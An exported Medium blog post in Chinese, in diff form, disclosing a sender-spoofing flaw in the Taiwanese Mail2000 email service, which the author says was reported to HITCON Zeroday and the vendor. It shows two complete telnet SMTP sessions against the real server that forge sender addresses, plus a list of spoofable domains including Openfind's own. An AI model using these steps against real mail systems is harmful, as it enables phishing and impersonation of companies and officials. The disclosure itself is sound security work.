@@ -1,0 +1,72 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Mail2000可以偽造寄件者寄信!?(1) — 內對外篇</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Mail2000可以偽造寄件者寄信!?(1) — 內對外篇</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+不知道大家有沒有聽過一個服務叫做Mail2000，據說是從西元2000開始做，到現在也23年了。應該算是台灣最大的商務電子郵件服務，許多企業、學校、政府單位都是買他們家的服務。
+</section>
+<section data-field="body" class="e-content">
+<section name="a483" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="4f82" id="4f82" class="graf graf--h3 graf--leading graf--title">Mail2000可以偽造寄件者寄信!?(1) — 內對外篇</h3><p name="f7ca" id="f7ca" class="graf graf--p graf-after--h3">不知道大家有沒有聽過一個服務叫做Mail2000，據說是從西元2000開始做，到現在也23年了。應該算是台灣最大的商務電子郵件服務，許多企業、學校、政府單位都是買他們家的服務。</p><p name="7617" id="7617" class="graf graf--p graf-after--p">如果我說我可以用修改任何寄件者寄出信件，是不是一件很瘋狂的事？</p><figure name="35f0" id="35f0" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*p6gnc-KlN53e2jxVgpe0aA.png" data-width="2936" data-height="1618" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*p6gnc-KlN53e2jxVgpe0aA.png"></figure><p name="52bf" id="52bf" class="graf graf--p graf-after--figure graf--trailing">先申明，本次漏洞已經向<a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-01010" data-href="https://zeroday.hitcon.org/vulnerability/ZD-2022-01010" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Hitcon Zeroday</a>與Mail2000官方通報。</p></div></div></section><section name="6616" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h4 name="5b70" id="5b70" class="graf graf--h4 graf--leading">如何修改寄件者？</h4><p name="d859" id="d859" class="graf graf--p graf-after--h4">首先我們要先擁有一組Mail2000帳號，為此我花了1500買了一年期個人版，接下來就能以這組帳號，偽造寄件者寄出信件。</p><figure name="6d9a" id="6d9a" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*o-akE-0KfM8XBu0ItTK2iw.png" data-width="1888" data-height="1426" src="https://cdn-images-1.medium.com/max/800/1*o-akE-0KfM8XBu0ItTK2iw.png"></figure><p name="c8c9" id="c8c9" class="graf graf--p graf--empty graf-after--figure"><br></p><p name="b6cb" id="b6cb" class="graf graf--p graf-after--p">要修改寄件者我們要以Telnet寄信，SMTP是個很古老的協定，傳統上還是能透過25port連線到SMTP伺服器來寄信。先偽造一個<em class="markup--em markup--p-em">admin@mail2000.com.tw</em>寄信給Gmail，然後看看有沒有收到</p><pre data-code-block-mode="2" spellcheck="false" data-code-block-lang="shell" name="e6f5" id="e6f5" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta prompt_">$ </span><span class="language-bash">telnet tls.mail2000.com.tw 25</span><br />Trying 203.69.82.30...<br />Connected to tls.mail2000.com.tw.<br />Escape character is &#x27;^]&#x27;.<br />220 www2.mail2000.com.tw ESMTP Service(Mail2000 ESMTP Server V4.50M) ready Mon, 12 Dec 2022 23:29:54 +0800 (CST)<br /><br />HELO www.mail2000.com.tw<br />AUTH LOGIN<br />&lt;ACCOUNT_BASE64&gt;<br />&lt;PASSWORD_BASE64&gt;<br />MAIL FROM:&lt;admin@mail2000.com.tw&gt;<br />RCPT TO:&lt;your@gmail.com&gt;<br />DATA<br /><br />FROM:admin@mail2000.com.tw<br />TO:your@gmail.com<br />SUBJECT:Test Mail<br />Test Mail</span></pre><p name="27b6" id="27b6" class="graf graf--p graf-after--pre">於是就看到他好好地出現在Gmail寄件夾。</p><figure name="e7ff" id="e7ff" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*3KSlFmmN_I7GoG8aY0L7nA.png" data-width="790" data-height="436" src="https://cdn-images-1.medium.com/max/800/1*3KSlFmmN_I7GoG8aY0L7nA.png"></figure><p name="5c44" id="5c44" class="graf graf--p graf-after--figure">SPF通過了，DKIM失敗了，但怎麼沒有DMARC？啊，官方原本就沒上DMARC。官方要擋下檢查也很簡單，就檢查登入的帳號跟head From、body From有沒有一致。</p><figure name="843e" id="843e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*9d3rG1ww125w1gESAlhcag.png" data-width="1788" data-height="854" src="https://cdn-images-1.medium.com/max/800/1*9d3rG1ww125w1gESAlhcag.png"></figure><p name="fd0e" id="fd0e" class="graf graf--p graf-after--figure">但DKIM為啥不會過？我百思不得其解，用了原本使用者email用SMTP寄信也是FAIL，看來是Mail2000伺服器設定壞了，但偽造官方的<em class="markup--em markup--p-em">openfind.com.tw</em>的DKIM卻通過了！？真是太神奇了</p><figure name="b63f" id="b63f" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*vpWBEk3vxZ2jFoeH2HGBAg.png" data-width="1662" data-height="816" src="https://cdn-images-1.medium.com/max/800/1*vpWBEk3vxZ2jFoeH2HGBAg.png"></figure><p name="2703" id="2703" class="graf graf--p graf-after--figure">這時候就可以來測試換換其他Domain是不是也可以寄到，經過幾輪測試下來，發現他後端會檢查domain是否在白名單，不是什麼都可以順利寄出。</p><p name="34d1" id="34d1" class="graf graf--p graf-after--p">經過一番測試看來是他們有提供的Domain都可以寄出，也<strong class="markup--strong markup--p-strong">包含Mail2000母公司Openfind官方的網域</strong>。</p><ul class="postList"><li name="f7f3" id="f7f3" class="graf graf--li graf-after--p"><strong class="markup--strong markup--li-strong">openfind.com.tw</strong></li><li name="15d0" id="15d0" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">openfind.com</strong></li><li name="1b93" id="1b93" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">mailcloud.com.tw</strong></li><li name="ee68" id="ee68" class="graf graf--li graf-after--li">mail2000.com.tw</li><li name="54ae" id="54ae" class="graf graf--li graf-after--li">kiss99.com</li><li name="8571" id="8571" class="graf graf--li graf-after--li">pie.com.tw</li><li name="b7b0" id="b7b0" class="graf graf--li graf-after--li">home.com.tw</li><li name="d32c" id="d32c" class="graf graf--li graf-after--li">88mail.com.tw</li><li name="6754" id="6754" class="graf graf--li graf-after--li">m168.com.tw</li><li name="9fdc" id="9fdc" class="graf graf--li graf-after--li">shop888.tw</li></ul><figure name="3be5" id="3be5" class="graf graf--figure graf-after--li"><img class="graf-image" data-image-id="1*SNM0mrVwqUakxRLmxRte_g.png" data-width="1126" data-height="422" src="https://cdn-images-1.medium.com/max/800/1*SNM0mrVwqUakxRLmxRte_g.png"></figure><p name="5893" id="5893" class="graf graf--p graf-after--figure">除此之外，任何Mailcloud的企業用戶也會能被盜用，真的太慘了。</p><figure name="d080" id="d080" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*NjdJWnp0vnZXd-lTxtdaDw.png" data-width="2680" data-height="1392" src="https://cdn-images-1.medium.com/max/800/1*NjdJWnp0vnZXd-lTxtdaDw.png"></figure><p name="9323" id="9323" class="graf graf--p graf-after--figure">下面是偽造漢堡王的信件。</p><figure name="a428" id="a428" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*fmw60BMa-nvYCFLMROZv4A.png" data-width="696" data-height="550" src="https://cdn-images-1.medium.com/max/800/1*fmw60BMa-nvYCFLMROZv4A.png"></figure><figure name="fdbb" id="fdbb" class="graf graf--figure graf-after--figure graf--trailing"><img class="graf-image" data-image-id="1*lnDS5N8j165zzOl69JyS5Q.png" data-width="1798" data-height="866" src="https://cdn-images-1.medium.com/max/800/1*lnDS5N8j165zzOl69JyS5Q.png"></figure></div></div></section><section name="bf60" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h4 name="fc6c" id="fc6c" class="graf graf--h4 graf--leading">修改Body</h4><p name="2516" id="2516" class="graf graf--p graf-after--h4">到這邊就以為結束了？還沒完，雖然改了head中的from到任意domain就會無法寄信，但我們還可以改body啊，就先用head中的from騙過檢查。</p><pre data-code-block-mode="2" spellcheck="false" data-code-block-lang="shell" name="3c43" id="3c43" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta prompt_">$ </span><span class="language-bash">telnet tls.mail2000.com.tw 25</span><br />Trying 203.69.82.30...<br />Connected to tls.mail2000.com.tw.<br />Escape character is &#x27;^]&#x27;.<br />220 www2.mail2000.com.tw ESMTP Service(Mail2000 ESMTP Server V4.50M) ready Mon, 12 Dec 2022 23:29:54 +0800 (CST)<br /><br />HELO www.mail2000.com.tw<br />AUTH LOGIN<br />&lt;ACCOUNT_BASE64&gt;<br />&lt;PASSWORD_BASE64&gt;<br />MAIL FROM:&lt;admin@mail2000.com.tw&gt;<br />RCPT TO:&lt;your@gmail.com&gt;<br />DATA<br /><br />FROM:fake@any.com<br />TO:your@gmail.com<br />SUBJECT:Test Mail<br />Test Mail</span></pre><p name="9eff" id="9eff" class="graf graf--p graf-after--pre">到Gmail看果然收到了！還會顯示透過mail2000.com.tw寄出XD。</p><figure name="9b79" id="9b79" class="graf graf--figure graf-after--p graf--trailing"><img class="graf-image" data-image-id="1*RH_FTaNQVFrRA4YNG92o8g.png" data-width="918" data-height="498" src="https://cdn-images-1.medium.com/max/800/1*RH_FTaNQVFrRA4YNG92o8g.png"></figure></div></div></section><section name="b4a1" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="e1d7" id="e1d7" class="graf graf--p graf--leading">更謎的是，2020年他們就已經發過公告，請大家要小心偽造管理員的信，可是卻一直不把這漏洞修掉？還把他放到首頁最上面。大家使用Mail伺服器的時候還是要多加注意。</p><figure name="27ca" id="27ca" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*UXZdZFK1whCnb_WwswMn6Q.png" data-width="2932" data-height="372" src="https://cdn-images-1.medium.com/max/800/1*UXZdZFK1whCnb_WwswMn6Q.png"></figure><figure name="200d" id="200d" class="graf graf--figure graf-after--figure"><img class="graf-image" data-image-id="1*DBoZs8lW0-zvk4FvKjfQOQ.png" data-width="1350" data-height="1580" src="https://cdn-images-1.medium.com/max/800/1*DBoZs8lW0-zvk4FvKjfQOQ.png"></figure><figure name="6096" id="6096" class="graf graf--figure graf-after--figure"><img class="graf-image" data-image-id="1*0dsbl4Verm0kASurYfZIlg.png" data-width="1346" data-height="1588" src="https://cdn-images-1.medium.com/max/800/1*0dsbl4Verm0kASurYfZIlg.png"></figure><p name="8069" id="8069" class="graf graf--p graf--empty graf-after--figure graf--trailing"><br></p></div></div></section>
+</section>
+<footer><p><a href="https://medium.com/p/6728dcf1b7c">View original.</a></p><p>Exported from <a href="https://medium.com">Medium</a> on May 29, 2026.</p></footer></article></body></html>
